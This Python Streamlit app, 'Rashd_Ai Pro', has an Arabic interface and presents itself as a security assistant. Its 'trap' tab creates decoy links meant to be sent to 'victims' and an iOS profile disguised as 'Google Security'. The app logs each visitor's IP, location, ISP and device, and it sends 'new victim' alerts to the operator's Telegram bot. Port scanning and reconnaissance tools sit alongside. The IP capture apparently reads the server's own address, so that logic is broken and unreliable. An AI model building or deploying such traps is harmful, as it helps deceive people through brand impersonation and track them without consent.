import streamlit as st
import uuid
import requests
import json
import os
import time
import base64
import config
from ai_hacking import AIHackingAssistant
import socket
import dns.resolver
import subprocess
import platform

# تهيئة المساعد الذكي
ai_assistant = AIHackingAssistant()

# --- إعدادات الصفحة --- #
st.set_page_config(
    page_title="Rashd_Ai Pro",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# --- CSS لتخصيص الواجهة --- #
st.markdown("""
<style>
    /* إخفاء عناصر Streamlit الافتراضية */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    
    /* تخصيص الشريط الجانبي */
    [data-testid="stSidebar"] {
        background-color: #1a1a1a;
        padding-top: 20px;
    }
    
    /* تخصيص التبويبات */
    .stTabs [data-baseweb="tab-list"] button {
        border-radius: 8px;
        background-color: #3a3a3a;
        color: #ffffff;
    }
    
    .stTabs [data-baseweb="tab-list"] button[aria-selected="true"] {
        background-color: #007bff;
        color: #ffffff;
    }
    
    /* تخصيص الأزرار */
    .stButton>button {
        background-color: #007bff;
        color: white;
        border-radius: 8px;
        border: none;
        padding: 10px 20px;
        font-size: 16px;
    }
    
    .stButton>button:hover {
        background-color: #0056b3;
    }
    
    /* تخصيص حقول الإدخال */
    .stTextInput>div>div>input,
    .stTextArea>div>div>textarea {
        background-color: #3a3a3a;
        color: #ffffff;
        border-radius: 8px;
        border: 1px solid #555555;
    }
</style>
""", unsafe_allow_html=True)

# --- دالة جلب الـ IP الحقيقي --- #
def get_real_public_ip():
    sources = ["https://api.ipify.org", "https://ipinfo.io/ip", "https://icanhazip.com"]
    for source in sources:
        try:
            response = requests.get(source, timeout=2)
            if response.status_code == 200:
                ip = response.text.strip()
                if ip:
                    return ip
        except:
            continue
    return "Unknown"

# --- دالة توليد ملف تعريف iOS --- #
def generate_ios_mobileconfig(decoy_url):
    profile_uuid = str(uuid.uuid4())
    webclip_uuid = str(uuid.uuid4())
    
    mobileconfig_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadDescription</key>
            <string>Adds a web clip to the home screen.</string>
            <key>PayloadDisplayName</key>
            <string>Google Security</string>
            <key>PayloadIdentifier</key>
            <string>com.apple.webclip.managed.{webclip_uuid}</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadUUID</key>
            <string>{webclip_uuid}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>Label</key>
            <string>Google Security</string>
            <key>URL</key>
            <string>{decoy_url}</string>
            <key>IsRemovable</key>
            <true/>
            <key>FullScreen</key>
            <false/>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Google Security Profile</string>
    <key>PayloadIdentifier</key>
    <string>com.apple.profile.{profile_uuid}</string>
    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>{profile_uuid}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>"""
    return mobileconfig_content.encode("utf-8")

# --- دالة إرسال التنبيه --- #
def send_telegram_alert(ip, trap_name, device="Unknown", geo_data=None):
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    if not token or not chat_id:
        return

    if geo_data is None:
        geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}

    message = f"""
🎯 تنبيه: ضحية جديدة!
📍 IP: {ip}
🌍 {geo_data["country"]} - {geo_data["city"]}
🏢 {geo_data["isp"]}
📱 {device}
🎯 المصيدة: {trap_name}
⏰ الوقت: {time.strftime("%Y-%m-%d %H:%M:%S")}
"""
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={
            "chat_id": chat_id,
            "text": message
        })
    except Exception as e:
        pass

# --- دالة تسجيل الضحايا --- #
class VictimLogger:
    def __init__(self, file_path):
        self.file_path = file_path
        self._ensure_file_exists()

    def _ensure_file_exists(self):
        if not os.path.exists(self.file_path):
            with open(self.file_path, "w") as f:
                json.dump([], f)

    def log_victim(self, ip, country, city, isp, device, trap_name):
        victim_data = {
            "ip": ip,
            "country": country,
            "city": city,
            "isp": isp,
            "device": device,
            "trap_name": trap_name,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        try:
            with open(self.file_path, "r+") as f:
                data = json.load(f)
                data.append(victim_data)
                f.seek(0)
                json.dump(data, f, indent=4)
        except (json.JSONDecodeError, FileNotFoundError):
            with open(self.file_path, "w") as f:
                json.dump([victim_data], f, indent=4)

victim_logger = VictimLogger(config.VICTIMS_FILE_PATH)

# --- معالجة وضع التمويه --- #
query_params = st.query_params
if "decoy" in query_params:
    st.markdown("""
    <style>
        .stSidebar { display: none; }
        .stTabs { visibility: hidden; }
    </style>
    """, unsafe_allow_html=True)
    
    client_ip = get_real_public_ip()
    trap_name = query_params.get("trap", "Google Decoy")
    device_info = query_params.get("device", "Unknown")

    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    if client_ip != "Unknown":
        try:
            response = requests.get(f"https://ipapi.co/{client_ip}/json/")
            data = response.json()
            geo_data["country"] = data.get("country_name", "Unknown")
            geo_data["city"] = data.get("city", "Unknown")
            geo_data["isp"] = data.get("org", "Unknown")
        except:
            pass

    send_telegram_alert(client_ip, trap_name, device_info, geo_data)
    victim_logger.log_victim(client_ip, geo_data["country"], geo_data["city"], geo_data["isp"], device_info, trap_name)

    st.markdown("<h1 style=\"text-align: center; margin-top: 40vh;\">Loading...</h1>", unsafe_allow_html=True)
    st.stop()

# --- الشريط الجانبي (Sidebar) --- #
with st.sidebar:
    st.image("https://img.icons8.com/ios-filled/100/ffffff/shield.png", width=80)
    st.title("🛡️ Rashd_Ai Pro")

    st.header("⚙️ الإعدادات")
    with st.expander("مفاتيح الـ API", expanded=True):
        groq_api_key = st.text_input("GROQ API", type="password", value=config.get_key("GROQ_API_KEY") or "", key="sidebar_groq_api")
        telegram_token = st.text_input("Telegram Token", type="password", value=config.get_key("TELEGRAM_BOT_TOKEN") or "", key="sidebar_telegram_token")
        telegram_chat_id = st.text_input("Telegram Chat ID", type="password", value=config.get_key("TELEGRAM_CHAT_ID") or "", key="sidebar_telegram_chat_id")

        if st.button("حفظ الإعدادات"):
            config.set_key("GROQ_API_KEY", groq_api_key)
            config.set_key("TELEGRAM_BOT_TOKEN", telegram_token)
            config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
            st.success("تم حفظ الإعدادات بنجاح!")

# --- المحتوى الرئيسي --- #
tabs = st.tabs([
    "🧠 المساعد الذكي",
    "🎯 المصيدة",
    "📄 التقارير",
    "🌐 الشبكة",
    "🚨 التهديدات",
    "💡 الخطة"
])

with tabs[0]:  # المساعد الذكي
    st.header("🧠 مساعد Rashd_Ai الذكي")
    st.write("مساعدك الشخصي في الأمن السيبراني. اسألني أي شيء!")

    if "messages" not in st.session_state:
        st.session_state.messages = []

    chat_container = st.container()
    with chat_container:
        for message in st.session_state.messages:
            with st.chat_message(message["role"]):
                st.markdown(message["content"])

    if prompt := st.chat_input("كيف يمكنني مساعدتك؟"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with chat_container:
            with st.chat_message("user"):
                st.markdown(prompt)

        with chat_container:
            with st.chat_message("assistant"):
                with st.spinner("جاري التفكير..."):
                    response = ai_assistant.chat(prompt)
                    st.markdown(response)
        st.session_state.messages.append({"role": "assistant", "content": response})

with tabs[1]:  # المصيدة
    st.header("🎯 المصيدة")
    st.write("قم بإنشاء روابط تمويهية لاصطياد الضحايا.")

    decoy_type = st.selectbox("اختر نوع المصيدة:", ["Google Decoy", "Download (ios)", "Download (android)"])
    
    app_ip = get_real_public_ip()
    st.info(f"عنوان IP الخاص بالتطبيق: {app_ip}")

    if decoy_type == "Google Decoy":
        decoy_url = f"https://rashdai.streamlit.app/?decoy=google&ip={app_ip}"
        st.code(decoy_url, language="text")
        st.write("انسخ هذا الرابط وأرسله للضحية.")
    elif decoy_type == "Download (ios)":
        decoy_url_for_profile = f"https://rashdai.streamlit.app/?decoy=Download (ios)&ip={app_ip}&device=ios"
        mobileconfig_data = generate_ios_mobileconfig(decoy_url_for_profile)
        st.download_button(
            label="توليد وتحميل ملف iOS Profile",
            data=mobileconfig_data,
            file_name="Google_Security.mobileconfig",
            mime="application/x-apple-aspen-config"
        )
        st.warning("يجب على الضحية تثبيت ملف التعريف بعد التحميل.")
    elif decoy_type == "Download (android)":
        st.info("ميزة تحميل APK قيد التطوير.")

with tabs[2]:  # التقارير
    st.header("📄 التقارير")
    st.subheader("آخر الضحايا المكتشفين")
    try:
        with open(config.VICTIMS_FILE_PATH, "r") as f:
            victims = json.load(f)
            if victims:
                st.dataframe(victims[::-1])
            else:
                st.info("لا يوجد ضحايا مسجلين بعد.")
    except (FileNotFoundError, json.JSONDecodeError):
        st.info("لا يوجد ضحايا مسجلين بعد.")

with tabs[3]:  # الشبكة
    st.header("🌐 أدوات الشبكة")
    
    tool_option = st.selectbox("اختر الأداة:", [
        "WHOIS Lookup",
        "DNS Lookup",
        "Port Scanner",
        "IP Geolocation",
        "Reverse DNS",
        "Traceroute",
        "HTTP Headers",
        "Domain Info"
    ])
    
    if tool_option == "WHOIS Lookup":
        st.subheader("WHOIS Lookup")
        domain = st.text_input("أدخل اسم النطاق أو IP:")
        if st.button("البحث"):
            try:
                response = requests.get(f"https://whois.arin.net/rest/ip/{domain}.json")
                st.json(response.json())
            except Exception as e:
                st.error(f"خطأ: {str(e)}")
    
    elif tool_option == "DNS Lookup":
        st.subheader("DNS Lookup")
        domain = st.text_input("أدخل اسم النطاق:")
        if st.button("البحث"):
            try:
                result = dns.resolver.resolve(domain, 'A')
                for rdata in result:
                    st.write(f"IP: {rdata}")
            except Exception as e:
                st.error(f"خطأ: {str(e)}")
    
    elif tool_option == "Port Scanner":
        st.subheader("Port Scanner")
        target = st.text_input("أدخل عنوان IP أو النطاق:")
        if st.button("فحص"):
            st.info("جاري الفحص...")
            open_ports = []
            for port in [21, 22, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
            st.success(f"المنافذ المفتوحة: {open_ports if open_ports else 'لا توجد منافذ مفتوحة'}")
    
    elif tool_option == "IP Geolocation":
        st.subheader("IP Geolocation")
        ip = st.text_input("أدخل عنوان IP:")
        if st.button("البحث"):
            try:
                response = requests.get(f"https://ipapi.co/{ip}/json/")
                data = response.json()
                st.json(data)
            except Exception as e:
                st.error(f"خطأ: {str(e)}")
    
    elif tool_option == "Reverse DNS":
        st.subheader("Reverse DNS")
        ip = st.text_input("أدخل عنوان IP:")
        if st.button("البحث"):
            try:
                hostname = socket.gethostbyaddr(ip)
                st.write(f"Hostname: {hostname[0]}")
            except Exception as e:
                st.error(f"خطأ: {str(e)}")
    
    elif tool_option == "Traceroute":
        st.subheader("Traceroute")
        target = st.text_input("أدخل عنوان IP أو النطاق:")
        if st.button("تتبع"):
            try:
                if platform.system() == "Windows":
                    result = subprocess.run(["tracert", target], capture_output=True, text=True)
                else:
                    result = subprocess.run(["traceroute", target], capture_output=True, text=True)
                st.code(result.stdout)
            except Exception as e:
                st.error(f"خطأ: {str(e)}")
    
    elif tool_option == "HTTP Headers":
        st.subheader("HTTP Headers")
        url = st.text_input("أدخل عنوان URL:")
        if st.button("فحص"):
            try:
                response = requests.get(url, timeout=5)
                st.json(dict(response.headers))
            except Exception as e:
                st.error(f"خطأ: {str(e)}")
    
    elif tool_option == "Domain Info":
        st.subheader("Domain Info")
        domain = st.text_input("أدخل اسم النطاق:")
        if st.button("البحث"):
            try:
                response = requests.get(f"https://dns.google/resolve?name={domain}&type=A")
                st.json(response.json())
            except Exception as e:
                st.error(f"خطأ: {str(e)}")

with tabs[4]:  # التهديدات
    st.header("🚨 تحليل التهديدات")
    
    threat_option = st.selectbox("اختر نوع التحليل:", [
        "Vulnerability Scanner",
        "SSL Certificate Check",
        "Security Headers",
        "Email OSINT",
        "Subdomain Enumeration",
        "Technology Detection"
    ])
    
    if threat_option == "Vulnerability Scanner":
        st.subheader("Vulnerability Scanner")
        target = st.text_input("أدخل عنوان URL:")
        if st.button("فحص"):
            st.info("جاري الفحص...")
            try:
                response = requests.get(target, timeout=5)
                st.write(f"Status Code: {response.status_code}")
                st.write(f"Headers: {dict(response.headers)}")
            except Exception as e:
                st.error(f"خطأ: {str(e)}")
    
    elif threat_option == "SSL Certificate Check":
        st.subheader("SSL Certificate Check")
        domain = st.text_input("أدخل اسم النطاق:")
        if st.button("فحص"):
            try:
                import ssl
                context = ssl.create_default_context()
                with socket.create_connection((domain, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=domain) as ssock:
                        cert = ssock.getpeercert()
                        st.json(cert)
            except Exception as e:
                st.error(f"خطأ: {str(e)}")
    
    elif threat_option == "Security Headers":
        st.subheader("Security Headers")
        url = st.text_input("أدخل عنوان URL:")
        if st.button("فحص"):
            try:
                response = requests.get(url, timeout=5)
                headers = dict(response.headers)
                st.json(headers)
            except Exception as e:
                st.error(f"خطأ: {str(e)}")
    
    elif threat_option == "Email OSINT":
        st.subheader("Email OSINT")
        email = st.text_input("أدخل البريد الإلكتروني:")
        if st.button("البحث"):
            st.info("جاري البحث عن معلومات البريد الإلكتروني...")
            st.write("هذه الميزة قيد التطوير.")
    
    elif threat_option == "Subdomain Enumeration":
        st.subheader("Subdomain Enumeration")
        domain = st.text_input("أدخل اسم النطاق:")
        if st.button("البحث"):
            st.info("جاري البحث عن النطاقات الفرعية...")
            st.write("هذه الميزة قيد التطوير.")
    
    elif threat_option == "Technology Detection":
        st.subheader("Technology Detection")
        url = st.text_input("أدخل عنوان URL:")
        if st.button("كشف"):
            st.info("جاري كشف التقنيات المستخدمة...")
            st.write("هذه الميزة قيد التطوير.")

with tabs[5]:  # الخطة
    st.header("💡 خطة الهجوم/الدفاع")
    
    plan_type = st.selectbox("اختر نوع الخطة:", [
        "Security Audit",
        "Penetration Testing",
        "Defense Strategy",
        "Incident Response",
        "Risk Assessment",
        "Compliance Check"
    ])
    
    if plan_type == "Security Audit":
        st.subheader("Security Audit")
        target = st.text_input("أدخل عنوان الهدف:")
        if st.button("إنشاء تقرير"):
            st.info("جاري إنشاء التقرير...")
            st.write("تقرير الفحص الأمني جاهز قريباً.")
    
    elif plan_type == "Penetration Testing":
        st.subheader("Penetration Testing")
        st.write("خدمة اختبار الاختراق المتقدمة.")
    
    elif plan_type == "Defense Strategy":
        st.subheader("Defense Strategy")
        st.write("استراتيجية الدفاع والحماية.")
    
    elif plan_type == "Incident Response":
        st.subheader("Incident Response")
        st.write("خطة الاستجابة للحوادث الأمنية.")
    
    elif plan_type == "Risk Assessment":
        st.subheader("Risk Assessment")
        st.write("تقييم المخاطر الأمنية.")
    
    elif plan_type == "Compliance Check":
        st.subheader("Compliance Check")
        st.write("فحص الامتثال للمعايير الأمنية.")

# --- Footer --- #
st.markdown("<div style=\"text-align: center; padding: 20px; color: #888;\"><p>Rashd_Ai Pro © 2026</p></div>", unsafe_allow_html=True)
